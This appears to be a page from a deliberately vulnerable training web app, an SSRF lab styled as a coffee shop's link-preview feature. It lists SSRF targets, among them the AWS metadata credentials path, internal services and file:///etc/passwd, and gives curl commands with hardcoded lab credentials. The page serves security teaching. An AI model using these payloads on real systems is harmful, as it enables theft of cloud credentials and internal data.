<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SSRF Lab | Breuta Coffee</title>
<link rel="stylesheet" href="/assets/css/style.css">
</head>
<body>
<?php include '/var/www/html/includes/navbar.php'; ?>

<div class="page-header">
  <div class="container">
    <h1>🌐 SSRF – Server-Side Request Forgery</h1>
    <p>Coffee origin link preview — powered by our internal fetcher</p>
  </div>
</div>

<div class="container">

  <div class="vuln-hint">
    <h4>🧑‍🎓 Lab Exercise: Server-Side Request Forgery</h4>
    <p>The "Link Preview" feature fetches any URL server-side. There is no URL whitelist or validation.<br>
    Use it to reach internal services, cloud metadata endpoints, or internal network resources.</p>
    <p style="margin-top:.5rem;"><strong>Targets to try:</strong></p>
    <ul style="margin-left:1.5rem; margin-top:.4rem;">
      <li><code>http://169.254.169.254/latest/meta-data/</code> — AWS IMDSv1</li>
      <li><code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code></li>
      <li><code>http://mysql-db:3306/</code> — Internal MySQL</li>
      <li><code>http://flask-api:5000/api/health</code> — Internal Flask API</li>
      <li><code>file:///etc/passwd</code> — Local file (if curl is used)</li>
    </ul>
  </div>

  <!-- Login first -->
  <div class="card">
    <h2>Step 1 — Login</h2>
    <div class="form-group"><label>Username</label><input type="text" id="username" value="bob_smith"></div>
    <div class="form-group"><label>Password</label><input type="password" id="password" value="coffee2024"></div>
    <button onclick="doLogin()">Login</button>
    <div id="login-status" style="margin-top:.5rem;"></div>
  </div>

  <!-- SSRF form -->
  <div class="card">
    <h2>Step 2 — Coffee Origin Link Preview</h2>
    <p>Enter a URL to preview its content (e.g., a farm's website for coffee origin info):</p>
    <div class="form-group">
      <label>URL to Fetch</label>
      <input type="text" id="ssrf-url" value="http://169.254.169.254/latest/meta-data/" placeholder="http://...">
    </div>
    <button onclick="doSSRF()">Fetch Preview</button>
    <div id="ssrf-status" style="margin-top:.5rem;"></div>
  </div>

  <div id="ssrf-output-card" class="card" style="display:none;">
    <h2>Server Response</h2>
    <p>Status: <span id="ssrf-code" style="font-weight:bold;"></span></p>
    <div id="ssrf-output" class="json-block" style="margin-top:1rem; min-height:80px;"></div>
  </div>

  <div class="card">
    <h2>💡 Curl Commands</h2>
    <pre style="background:#1e1e1e; color:#d4d4d4; padding:1rem; border-radius:6px; overflow-x:auto; font-size:.82rem;">
# 1. Login
TOKEN=$(curl -s -X POST http://breuta.co/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bob_smith","password":"coffee2024"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# 2. SSRF — AWS metadata
curl -X POST http://breuta.co/api/fetch-preview \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# 3. SSRF — Internal Flask API
curl -X POST http://breuta.co/api/fetch-preview \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://flask-api:5000/api/admin/users"}'
    </pre>
  </div>

</div>

<?php include '/var/www/html/includes/footer.php'; ?>
<script src="/assets/js/main.js"></script>
<script>
async function doLogin() {
  const r = await breuta.api('POST', '/auth/login', {
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  });
  if (r.token) {
    breuta.setToken(r.token);
    document.getElementById('login-status').innerHTML = '<div class="alert alert-success">✅ Logged in!</div>';
  } else {
    document.getElementById('login-status').innerHTML = `<div class="alert alert-danger">❌ ${r.error}</div>`;
  }
}

async function doSSRF() {
  const url = document.getElementById('ssrf-url').value;
  document.getElementById('ssrf-status').innerHTML = '<em>Fetching...</em>';
  try {
    const r = await breuta.api('POST', '/fetch-preview', { url });
    document.getElementById('ssrf-output-card').style.display = 'block';
    document.getElementById('ssrf-code').textContent = r.status || 'N/A';
    document.getElementById('ssrf-output').textContent = r.content || JSON.stringify(r, null, 2);
    document.getElementById('ssrf-status').innerHTML = '';
  } catch(e) {
    document.getElementById('ssrf-status').innerHTML = `<div class="alert alert-danger">Error: ${e.message}</div>`;
  }
}
</script>
</body>
</html>
